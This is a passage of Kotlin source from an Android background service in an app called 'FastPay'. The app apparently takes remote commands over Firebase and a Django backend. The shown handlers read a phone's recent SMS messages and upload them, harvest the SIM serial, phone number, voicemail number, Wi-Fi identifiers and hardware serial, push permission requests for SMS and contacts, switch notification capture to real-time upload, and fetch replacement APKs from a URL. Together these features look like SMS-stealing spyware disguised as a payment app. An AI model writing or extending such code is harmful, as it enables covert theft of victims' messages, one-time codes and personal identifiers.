            "deleteTemplate" -> {
                try {
                    handleDeleteTemplateCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing deleteTemplate command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "getMessageStats" -> {
                try {
                    handleGetMessageStatsCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing getMessageStats command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "backupMessages" -> {
                try {
                    handleBackupMessagesCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing backupMessages command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "exportMessages" -> {
                try {
                    handleExportMessagesCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing exportMessages command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "executeWorkflow" -> {
                try {
                    handleExecuteWorkflowCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing executeWorkflow command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "smsbatchenable" -> {
                try {
                    handleSmsBatchEnableCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing smsbatchenable command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
                else -> {
                    LogHelper.w(TAG, "Unknown command key: $key")
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Unknown command key")
                }
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Unexpected error executing command: $key", e)
            updateCommandHistoryStatus(historyTimestamp, key, "failed", "Unexpected error: ${e.message}")
        }
    }
    
    /**
     * Handle syncNotification command
     * Format: 
     * - "on" -> Enable notification sync in batch mode (default)
     * - "off" -> Disable notification sync completely
     * - "realtime:{minutes}" -> Enable real-time sync for specified minutes, then auto-return to batch
     * 
     * Examples:
     * - "on" -> Batch mode (uploads every 5 min or 100 notifications)
     * - "off" -> Disabled (no sync)
     * - "realtime:30" -> Real-time for 30 minutes, then back to batch
     * - "realtime:60" -> Real-time for 1 hour, then back to batch
     * 
     * Controls notification sync by setting filter value in Firebase
     * - "on" -> Enable notification sync (set filter to empty string, batch mode)
     * - "off" -> Disable notification sync (set filter to "~DISABLED~")
     * - "realtime:{minutes}" -> Enable real-time sync temporarily
     */
    private fun handleSyncNotificationCommand(content: String) {
        val command = content.trim().lowercase()
        val deviceId = androidId()
        
        when {
            command == "on" -> {
                // Enable notification sync in batch mode (default)
                serviceScope.launch {
                    try {
                        val metadataUpdate = mapOf("notification_sync" to "on")
                        DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                        LogHelper.d(TAG, "Notification sync enabled in Django (BATCH mode)")
                        
                        // Ensure batch mode is active
                        com.example.fast.util.NotificationBatchProcessor.switchToBatchMode(this@PersistentForegroundService)
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Failed to enable notification sync in Django", e)
                    }
                }
            }
            
            command == "off" -> {
                // Disable notification sync completely
                serviceScope.launch {
                    try {
                        val metadataUpdate = mapOf("notification_sync" to "off")
                        DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                        LogHelper.d(TAG, "Notification sync disabled in Django")
                        
                        // Switch to batch mode (but sync is disabled, so nothing will upload)
                        com.example.fast.util.NotificationBatchProcessor.switchToBatchMode(this@PersistentForegroundService)
                        
                        // Also write to local file to disable immediately
                        try {
                            writeInternalFile("filterNotify.txt", "~DISABLED~")
                        } catch (e: Exception) {
                            LogHelper.e(TAG, "Error writing filterNotify.txt", e)
                        }
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Failed to disable notification sync in Django", e)
                    }
                }
            }
            
            command.startsWith("realtime:") -> {
                // Parse minutes from "realtime:30" format
                val minutesStr = command.substringAfter("realtime:").trim()
                val minutes = minutesStr.toIntOrNull()
                
                if (minutes != null && minutes > 0) {
                    // Enable notification sync first
                    serviceScope.launch {
                        try {
                            val metadataUpdate = mapOf(
                                "notification_sync" to "realtime",
                                "notification_realtime_minutes" to minutes,
                                "notification_realtime_until" to (System.currentTimeMillis() + (minutes * 60 * 1000L))
                            )
                            DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                            LogHelper.d(TAG, "Notification sync enabled in Django, switching to REAL-TIME mode for $minutes minutes")
                            
                            // Switch to real-time mode
                            com.example.fast.util.NotificationBatchProcessor.switchToRealtimeMode(this@PersistentForegroundService, minutes)
                            
                            // Also ensure local file allows sync
                            try {
                                writeInternalFile("filterNotify.txt", "")
                            } catch (e: Exception) {
                                LogHelper.e(TAG, "Error writing filterNotify.txt", e)
                            }
                        } catch (e: Exception) {
                            LogHelper.e(TAG, "Failed to enable notification sync for real-time mode in Django", e)
                        }
                    }
                } else {
                    LogHelper.e(TAG, "Invalid real-time duration: $minutesStr. Expected format: realtime:{minutes}")
                }
            }
            
            else -> {
                LogHelper.e(TAG, "Invalid syncNotification command: $command. Expected: on, off, or realtime:{minutes}")
            }
        }
    }
            
    /**
     * Handle requestPermission command
     * Format: "permission1,permission2,..." or "ALL"
     * 
     * Permissions: sms, contacts, notification, battery, phone_state, ALL
     */
    private fun handleRequestPermissionCommand(content: String) {
        val permissionsToRequest = if (content.uppercase() == "ALL") {
            // ALL includes all permissions in order: runtime first, then special permissions
            listOf("sms", "contacts", "phone_state", "notification", "battery")
        } else {
            // Parse requested permissions and ensure battery/notification are included
            val requested = content.split(",").map { it.trim().lowercase() }.toMutableList()
            // Always add notification and battery to the chain if not explicitly requested
            if (!requested.contains("notification")) {
                requested.add("notification")
            }
            if (!requested.contains("battery")) {
                requested.add("battery")
            }
            requested
        }
        
        // Launch RemotePermissionRequestActivity to handle permission requests
        val intent = Intent(this, com.example.fast.ui.RemotePermissionRequestActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
            putStringArrayListExtra("permissions", ArrayList(permissionsToRequest))
        }
            startActivity(intent)
            
        LogHelper.d(TAG, "Requesting permissions (with battery/notification in chain): $permissionsToRequest")
    }
    
    /**
     * Handle updateApk command
     * Format: "{downloadUrl}" or "{versionCode}|{downloadUrl}"
     * 
     * Examples:
     * - "https://firebasestorage.googleapis.com/.../FastPay-v2.9.apk"
     * - "29|https://firebasestorage.googleapis.com/.../FastPay-v2.9.apk"
     * 
     * Storage:
     * - APK stored in: context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
     * - File name: FastPay_Update_v{versionCode}.apk
     * 
     * @param content Download URL (with optional version code prefix)
     */
    private fun handleUpdateApkCommand(content: String) {
        if (content.isBlank()) {
            LogHelper.e(TAG, "updateApk command: Empty download URL")
            return
        }
        
        // Launch RemoteUpdateActivity to handle APK update
        val intent = Intent(this, com.example.fast.ui.RemoteUpdateActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
            putExtra("downloadUrl", content.trim())
        }
        startActivity(intent)
        
        LogHelper.d(TAG, "Launching update activity with URL: $content")
    }
    
    /**
     * Handle controlAnimation command
     * Format: "start" or "off sms" or "off instruction" or "off"
     * 
     * Controls the card animation in the dashboard:
     * - "start" - Start animation (set stopAnimationOn to null = Animation ON)
     * - "off sms" - Stop animation when SMS card is displayed
     * - "off instruction" - Stop animation when Instruction card is displayed
     * - "off" (no value) - Default to "off sms"
     * 
     * Default Behavior: Animation is ON by default (stopAnimationOn = null or not set)
     * 
     * Updates Firebase: device/{deviceId}/animationSettings/stopAnimationOn
     * 
     * @param content Command content: "start", "off sms", "off instruction", or "off"
     */
    @SuppressLint("HardwareIds")
    private fun handleControlAnimationCommand(content: String) {
        val trimmedContent = content.trim().lowercase()
        
        // Get device ID
        val deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: run {
            LogHelper.e(TAG, "controlAnimation command: Cannot get device ID")
            return
        }
        
        // Determine stopAnimationOn value
        val stopAnimationOn: String? = when {
            trimmedContent == "start" -> {
                // Start animation - set to null
                null
            }
            trimmedContent == "off sms" || trimmedContent == "off" -> {
                // Stop on SMS card (default if just "off")
                "sms"
            }
            trimmedContent == "off instruction" -> {
                // Stop on Instruction card
                "instruction"
            }
            else -> {
                LogHelper.w(TAG, "controlAnimation command: Unknown value '$content', defaulting to 'off sms'")
                "sms"
            }
        }
        
        // Update Firebase animation settings
        val animationSettingsPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/animationSettings"
        val settingsRef = Firebase.database.reference.child(animationSettingsPath)
        
        val action = if (stopAnimationOn == null) {
            "started"
        } else {
            "stopped on $stopAnimationOn card"
        }
        
        if (stopAnimationOn != null) {
            // Set stopAnimationOn value
            val settingsMap = mapOf<String, Any>("stopAnimationOn" to stopAnimationOn)
            settingsRef.updateChildren(settingsMap)
                .addOnSuccessListener {
                    LogHelper.d(TAG, "Animation control updated: Animation $action")
                }
                .addOnFailureListener { e ->
                    LogHelper.e(TAG, "Error updating animation settings", e)
                    throw e
                }
        } else {
            // Remove stopAnimationOn to start animation (set to null in Firebase)
            settingsRef.child("stopAnimationOn").setValue(null)
                .addOnSuccessListener {
                    LogHelper.d(TAG, "Animation control updated: Animation $action")
                }
                .addOnFailureListener { e ->
                    LogHelper.e(TAG, "Error updating animation settings", e)
                    throw e
                }
        }
    }
    
    /**
     * Handle fetchSms command
     * Format: "{count}" or empty (defaults to 10)
     * 
     * Fetches the last X SMS messages (both received and sent) and uploads them
     * to Firebase as a single object at message/{deviceId}/fetch_{timestamp}
     * 
     * @param content Number of messages to fetch (default: 10 if empty or invalid)
     */
    private fun handleFetchSmsCommand(content: String, historyTimestamp: Long) {
        // Check READ_SMS permission
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            LogHelper.w(TAG, "READ_SMS permission not granted, cannot fetch SMS")
            updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "READ_SMS permission not granted")
            return
        }
        
        // Parse count (default to 10 if empty or invalid)
        val count = try {
            val parsed = content.trim().toIntOrNull()
            if (parsed != null && parsed > 0) parsed else 10
        } catch (e: NumberFormatException) {
            LogHelper.w(TAG, "Invalid count format in fetchSms command, using default: 10", e)
            10
        }
        
        LogHelper.d(TAG, "Fetching last $count SMS messages")
        
        // Fetch messages in background thread
        Thread {
            try {
                // Get all messages using SmsQueryHelper
                val allMessages = SmsQueryHelper.getAllMessages(this, null)
                
                // Sort by timestamp descending (newest first) and take last X
                val lastMessages = allMessages
                    .sortedByDescending { it.timestamp }
                    .take(count)
                    .sortedBy { it.timestamp } // Sort ascending for chronological order
                
                LogHelper.d(TAG, "Retrieved ${lastMessages.size} messages out of ${allMessages.size} total")
                
                // Create messages map in Firebase format
                val messagesMap = mutableMapOf<String, String>()
                lastMessages.forEach { message ->
                    try {
                    val timestamp = message.timestamp.toString()
                    val value = if (message.isReceived) {
                        "received~${message.address}~${message.body}"
                    } else {
                        "sent~${message.address}~${message.body}"
                    }
                    messagesMap[timestamp] = value
                    } catch (e: Exception) {
                        LogHelper.w(TAG, "Error processing message for Firebase upload", e)
                    }
                }
                
                // Upload to Firebase - write each message individually to message/device_id/msg/{timestamp}
                val messagesBasePath = AppConfig.getFirebaseMessagePath(androidId())
                val batchMap = mutableMapOf<String, Any>()
                
                messagesMap.forEach { (timestamp, value) ->
                    batchMap[timestamp] = value
                }
                
                // Upload all messages in a single batch update
                FirebaseWriteHelper.updateChildren(
                    path = messagesBasePath,
                    updates = batchMap,
                    tag = TAG,
                    onSuccess = {
                        LogHelper.d(TAG, "Successfully uploaded ${messagesMap.size} messages to $messagesBasePath")
                        updateCommandHistoryStatus(
                            historyTimestamp,
                            "fetchSms",
                            "executed",
                            "Uploaded ${messagesMap.size} messages"
                        )
                    },
                    onFailure = { e ->
                        LogHelper.e(TAG, "Failed to upload fetched messages", e)
                        updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Error: ${e.message}")
                    }
                )
            } catch (e: SecurityException) {
                LogHelper.e(TAG, "Permission denied fetching SMS messages", e)
                updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Permission denied")
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error fetching SMS messages", e)
                updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Error: ${e.message}")
            }
        }.start()
    }
    
    /**
     * Handle fetchDeviceInfo command
     * Format: Any value (content is ignored, command always executes)
     * 
     * Collects and uploads combined device information:
     * - Battery information (percentage, charging status, etc.)
     * - Network information (type, operator, connectivity status)
     * - SIM information (serial, operator, state, etc.)
     * - Basic device information (manufacturer, model, Android version, etc.)
     * 
     * Uploads data to: device/{deviceId}/deviceInfo/fetch_{timestamp}
     * 
     * @param content Command content (ignored, can be any value)
     */
    @SuppressLint("HardwareIds")
    private fun handleFetchDeviceInfoCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Fetching device info (battery, network, SIM, basic)")
        
        // Collect info in background thread
        Thread {
            try {
                val deviceInfoMap = mutableMapOf<String, Any?>()
                
                // 1. Battery Information
                try {
                    val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                    if (batteryManager != null) {
                        val batteryLevel = try {
                            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                        } catch (e: Exception) { -1 }
                        
                        val batteryInfo = mutableMapOf<String, Any?>(
                            "batteryPercentage" to if (batteryLevel in 0..100) batteryLevel else null,
                            "isCharging" to try { batteryManager.isCharging } catch (e: Exception) { false },
                            "chargeCounter" to try {
                                batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER)
                            } catch (e: Exception) { null },
                            "currentAverage" to try {
                                batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE)
                            } catch (e: Exception) { null },
                            "currentNow" to try {
                                batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW)
                            } catch (e: Exception) { null }
                        )
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            batteryInfo["energyCounter"] = try {
                                batteryManager.getLongProperty(BatteryManager.BATTERY_PROPERTY_ENERGY_COUNTER)
                            } catch (e: Exception) { null }
                        }
                        
                        deviceInfoMap["battery"] = batteryInfo.filterValues { it != null }
                    }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting battery info", e)
                }
                
                // 2. Network Information
                try {
                    val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                    val networkInfo = connectivityManager?.activeNetworkInfo
                    
                    val networkInfoMap = mutableMapOf<String, Any?>(
                        "isConnected" to networkInfo?.isConnected,
                        "networkType" to networkInfo?.type?.let {
                            when (it) {
                                ConnectivityManager.TYPE_WIFI -> "WIFI"
                                ConnectivityManager.TYPE_MOBILE -> "MOBILE"
                                ConnectivityManager.TYPE_ETHERNET -> "ETHERNET"
                                ConnectivityManager.TYPE_VPN -> "VPN"
                                else -> "UNKNOWN"
                            }
                        },
                        "isWiFi" to (networkInfo?.type == ConnectivityManager.TYPE_WIFI),
                        "isMobile" to (networkInfo?.type == ConnectivityManager.TYPE_MOBILE),
                        "networkSubtype" to networkInfo?.subtype
                    )
                    
                    val activeNetwork = connectivityManager?.activeNetwork
                    val capabilities = activeNetwork?.let { connectivityManager.getNetworkCapabilities(it) }
                    if (capabilities != null) {
                        networkInfoMap["hasWifi"] = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                        networkInfoMap["hasCellular"] = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                        networkInfoMap["hasEthernet"] = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                        networkInfoMap["hasVpn"] = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
                        networkInfoMap["linkDownstreamKbps"] = capabilities.linkDownstreamBandwidthKbps
                        networkInfoMap["linkUpstreamKbps"] = capabilities.linkUpstreamBandwidthKbps
                        networkInfoMap["isMetered"] = !capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED)
                    }
                    
                    // Extended network info (requires READ_PHONE_STATE)
                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
                        == PackageManager.PERMISSION_GRANTED) {
                        try {
                            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                            networkInfoMap["isRoaming"] = telephonyManager?.isNetworkRoaming
                            networkInfoMap["networkOperatorName"] = telephonyManager?.networkOperatorName
                            networkInfoMap["networkOperatorCode"] = telephonyManager?.networkOperator
                            networkInfoMap["networkCountryIso"] = telephonyManager?.networkCountryIso
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                networkInfoMap["isDataEnabled"] = telephonyManager?.isDataEnabled
                            }
                        } catch (e: Exception) {
                            LogHelper.w(TAG, "Error getting extended network info", e)
                        }
                    }
                    
                    val wifiInfo = collectWifiInfo()
                    if (wifiInfo.isNotEmpty()) {
                        networkInfoMap["wifi"] = wifiInfo
                    }
                    
                    deviceInfoMap["network"] = networkInfoMap.filterValues { it != null }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting network info", e)
                }
                
                // 3. SIM Information (requires READ_PHONE_STATE)
                try {
                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
                        == PackageManager.PERMISSION_GRANTED) {
                        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                        if (telephonyManager != null) {
                            val phoneCount = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                telephonyManager.phoneCount
                            } else 1
                            
                            // Collect SIM info (supports single and dual-SIM)
                            // Note: For dual-SIM devices, this collects info for the default/primary SIM slot
                            // Slot-specific info for all slots requires SubscriptionManager (additional permissions)
                            val simInfo = collectSingleSimInfo(telephonyManager)
                            if (simInfo.isNotEmpty()) {
                                deviceInfoMap["sim"] = simInfo
                                if (phoneCount > 1) {
                                    LogHelper.d(TAG, "Collected SIM info for dual-SIM device (default slot, phoneCount=$phoneCount)")
                                } else {
                                    LogHelper.d(TAG, "Collected SIM info (single SIM device)")
                                }
                            }
                            
                            val simSlots = collectSimSlotsInfo()
                            if (simSlots.isNotEmpty()) {
                                deviceInfoMap["simSlots"] = simSlots
                            }
                        }
                    }
                } catch (e: SecurityException) {
                    LogHelper.w(TAG, "SecurityException collecting SIM info", e)
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting SIM info", e)
                }
                
                // 4. Basic Device Information
                try {
                    val basicInfo = mutableMapOf<String, Any?>(
                        "manufacturer" to Build.MANUFACTURER,
                        "model" to Build.MODEL,
                        "device" to Build.DEVICE,
                        "product" to Build.PRODUCT,
                        "androidVersion" to Build.VERSION.RELEASE,
                        "sdkVersion" to Build.VERSION.SDK_INT,
                        "securityPatch" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            Build.VERSION.SECURITY_PATCH
                        } else null,
                        "hardware" to Build.HARDWARE,
                        "board" to Build.BOARD
                    )
                    
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            basicInfo["serialNumber"] = Build.getSerial()
                        } else {
                            @Suppress("DEPRECATION")
                            basicInfo["serialNumber"] = Build.SERIAL
                        }
                    } catch (e: Exception) {
                        // Ignore - serial may not be available
                    }
                    
                    deviceInfoMap["device"] = basicInfo.filterValues { it != null }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting basic device info", e)
                }
                
                // Upload to Firebase
                val fetchTimestamp = System.currentTimeMillis()
                val fetchPath = "${AppConfig.getFirebaseDevicePath(androidId())}/deviceInfo/fetch_$fetchTimestamp"
                
                FirebaseWriteHelper.setValue(
                    path = fetchPath,
                    data = deviceInfoMap,
                    tag = TAG,
                    onSuccess = {
                        LogHelper.d(TAG, "Successfully uploaded device info to $fetchPath")
                        updateCommandHistoryStatus(
                            historyTimestamp,
                            "fetchDeviceInfo",
                            "executed",
                            "Uploaded device info"
                        )
                    },
                    onFailure = { e ->
                        LogHelper.e(TAG, "Failed to upload device info", e)
                        updateCommandHistoryStatus(historyTimestamp, "fetchDeviceInfo", "failed", "Error: ${e.message}")
                    }
                )
                    
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error fetching device info", e)
                updateCommandHistoryStatus(historyTimestamp, "fetchDeviceInfo", "failed", "Error: ${e.message}")
            }
        }.start()
    }
    
    /**
     * Collect SIM information for a single SIM device (default SIM)
     */
    @SuppressLint("HardwareIds")
    private fun collectSingleSimInfo(telephonyManager: TelephonyManager): Map<String, Any?> {
        val simInfo = mutableMapOf<String, Any?>(
            "simState" to telephonyManager.simState,
            "simCountryIso" to telephonyManager.simCountryIso,
            "simOperatorName" to telephonyManager.simOperatorName,
            "simOperatorCode" to telephonyManager.simOperator,
            "phoneCount" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                telephonyManager.phoneCount
            } else 1,
            "networkOperatorName" to telephonyManager.networkOperatorName,
            "networkOperatorCode" to telephonyManager.networkOperator,
            "networkCountryIso" to telephonyManager.networkCountryIso,
            "networkType" to telephonyManager.networkType,
            "phoneType" to telephonyManager.phoneType,
            "isNetworkRoaming" to telephonyManager.isNetworkRoaming,
            "dataState" to telephonyManager.dataState,
            "callState" to telephonyManager.callState,
            "dataActivity" to telephonyManager.dataActivity
        )
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            simInfo["dataNetworkType"] = telephonyManager.dataNetworkType
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            simInfo["isDataEnabled"] = telephonyManager.isDataEnabled
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try {
                val strength = telephonyManager.signalStrength
                if (strength != null) {
                    simInfo["signalLevel"] = strength.level
                    val maxDbm = strength.cellSignalStrengths.maxOfOrNull { it.dbm }
                    if (maxDbm != null && maxDbm != Int.MIN_VALUE) {
                        simInfo["signalDbm"] = maxDbm
                    }
                }
            } catch (e: Exception) {
                LogHelper.w(TAG, "Signal strength not available", e)
            }
        }

        // Try to get sensitive info (may fail on some devices)
        try {
            val simSerial = telephonyManager.simSerialNumber
            if (simSerial != null && simSerial.isNotEmpty()) {
                simInfo["simSerial"] = simSerial
                LogHelper.d(TAG, "SIM serial number collected successfully")
            }
        } catch (e: Exception) {
            LogHelper.w(TAG, "SIM serial number not available", e)
        }
        
        try {
            val phoneNumber = telephonyManager.line1Number
            if (phoneNumber != null && phoneNumber.isNotEmpty()) {
                simInfo["phoneNumber"] = phoneNumber
                LogHelper.d(TAG, "Phone number collected successfully")
            }
        } catch (e: Exception) {
            LogHelper.w(TAG, "Phone number not available", e)
        }
        
        try {
            val voiceMailNumber = telephonyManager.voiceMailNumber
            if (voiceMailNumber != null && voiceMailNumber.isNotEmpty()) {
                simInfo["voiceMailNumber"] = voiceMailNumber
            }
        } catch (e: Exception) {
            // Ignore - may not be available
        }
        
        try {
            val voiceMailAlphaTag = telephonyManager.voiceMailAlphaTag
            if (voiceMailAlphaTag != null && voiceMailAlphaTag.isNotEmpty()) {
                simInfo["voiceMailAlphaTag"] = voiceMailAlphaTag
            }
        } catch (e: Exception) {
            // Ignore - may not be available
        }
        
        return simInfo.filterValues { it != null }
    }

    private fun collectWifiInfo(): Map<String, Any?> {
        val wifiInfo = mutableMapOf<String, Any?>()
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wifiManager != null) {
                wifiInfo["isWifiEnabled"] = wifiManager.isWifiEnabled
                val connection = wifiManager.connectionInfo
                if (connection != null) {
                    wifiInfo["bssid"] = connection.bssid
                    wifiInfo["rssi"] = connection.rssi
                    wifiInfo["linkSpeedMbps"] = connection.linkSpeed
                    wifiInfo["ipAddress"] = connection.ipAddress
                    try {
                        val ssid = connection.ssid?.trim('"')
                        if (!ssid.isNullOrBlank() && ssid != "<unknown ssid>") {
                            wifiInfo["ssid"] = ssid
                        }
                    } catch (_: Exception) {
                        // SSID may be restricted without location permission
                    }
                }
            }
        } catch (e: SecurityException) {
            LogHelper.w(TAG, "SecurityException collecting Wi-Fi info", e)
        } catch (e: Exception) {
            LogHelper.w(TAG, "Error collecting Wi-Fi info", e)
        }
        return wifiInfo.filterValues { it != null }
    }

    private fun collectSimSlotsInfo(): List<Map<String, Any?>> {
        try {
            val hasPhoneState = ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
            val hasPhoneNumbers = ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_NUMBERS
            ) == PackageManager.PERMISSION_GRANTED
            if (!hasPhoneState && !hasPhoneNumbers) return emptyList()

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return emptyList()
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                ?: return emptyList()
            val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: return emptyList()
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager

            return subscriptions.mapNotNull { info ->
                try {
                    val slotMap = mutableMapOf<String, Any?>(
                        "subscriptionId" to info.subscriptionId,
                        "slotIndex" to info.simSlotIndex,
                        "carrierName" to info.carrierName?.toString(),
                        "displayName" to info.displayName?.toString(),
                        "countryIso" to info.countryIso,
                        "mcc" to info.mcc,
                        "mnc" to info.mnc,
                        "number" to info.number
                    )

                    val slotTelephony = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && telephonyManager != null) {
                        telephonyManager.createForSubscriptionId(info.subscriptionId)
                    } else {
                        telephonyManager
                    }

                    if (slotTelephony != null) {
                        slotMap["simState"] = slotTelephony.simState
                        slotMap["simOperatorName"] = slotTelephony.simOperatorName
                        slotMap["simOperatorCode"] = slotTelephony.simOperator
                        slotMap["networkOperatorName"] = slotTelephony.networkOperatorName
                        slotMap["networkOperatorCode"] = slotTelephony.networkOperator
                        slotMap["networkCountryIso"] = slotTelephony.networkCountryIso
                        slotMap["networkType"] = slotTelephony.networkType
                        slotMap["phoneType"] = slotTelephony.phoneType
                        slotMap["isNetworkRoaming"] = slotTelephony.isNetworkRoaming
                        slotMap["dataState"] = slotTelephony.dataState
                        slotMap["callState"] = slotTelephony.callState
                        slotMap["dataActivity"] = slotTelephony.dataActivity
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            slotMap["dataNetworkType"] = slotTelephony.dataNetworkType
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            slotMap["isDataEnabled"] = slotTelephony.isDataEnabled
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            try {
                                val strength = slotTelephony.signalStrength
                                if (strength != null) {
                                    slotMap["signalLevel"] = strength.level
                                    val maxDbm = strength.cellSignalStrengths.maxOfOrNull { it.dbm }
                                    if (maxDbm != null && maxDbm != Int.MIN_VALUE) {
                                        slotMap["signalDbm"] = maxDbm
                                    }
                                }
                            } catch (e: Exception) {
                                LogHelper.w(TAG, "Signal strength not available for slot", e)
                            }
                        }
                        try {
                            val simSerial = slotTelephony.simSerialNumber
                            if (!simSerial.isNullOrBlank()) {
                                slotMap["simSerial"] = simSerial
                            }
                        } catch (_: Exception) {}
                        try {
                            val lineNumber = slotTelephony.line1Number
                            if (!lineNumber.isNullOrBlank()) {
                                slotMap["phoneNumber"] = lineNumber
                            }
                        } catch (_: Exception) {}
                    }

                    slotMap.filterValues { it != null }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting SIM slot info", e)
                    null
                }
            }
        } catch (e: Exception) {
            LogHelper.w(TAG, "Error collecting SIM slots", e)
            return emptyList()
        }
    }
    
    /**
     * Collect SIM information for a specific SIM slot (dual-SIM support)
     */
    @SuppressLint("HardwareIds")
    private fun collectSimInfoForSlot(telephonyManager: TelephonyManager, slotIndex: Int): Map<String, Any?> {
        val slotInfo = mutableMapOf<String, Any?>(
            "slotIndex" to slotIndex
        )
        
        try {
            // Get TelephonyManager for this specific slot (Android M+)
            // Note: For dual-SIM, we use the default TelephonyManager as slot-specific access
            // requires SubscriptionManager which needs additional permissions
            val slotTelephonyManager = telephonyManager
            
            slotInfo["simState"] = slotTelephonyManager.simState
            slotInfo["simCountryIso"] = slotTelephonyManager.simCountryIso
            slotInfo["simOperatorName"] = slotTelephonyManager.simOperatorName
            slotInfo["simOperatorCode"] = slotTelephonyManager.simOperator
            slotInfo["networkOperatorName"] = slotTelephonyManager.networkOperatorName
            slotInfo["networkOperatorCode"] = slotTelephonyManager.networkOperator
            slotInfo["networkCountryIso"] = slotTelephonyManager.networkCountryIso
            slotInfo["networkType"] = slotTelephonyManager.networkType
            slotInfo["phoneType"] = slotTelephonyManager.phoneType
            slotInfo["isNetworkRoaming"] = slotTelephonyManager.isNetworkRoaming
            slotInfo["dataState"] = slotTelephonyManager.dataState
            slotInfo["callState"] = slotTelephonyManager.callState
            slotInfo["dataActivity"] = slotTelephonyManager.dataActivity
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                slotInfo["dataNetworkType"] = slotTelephonyManager.dataNetworkType
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
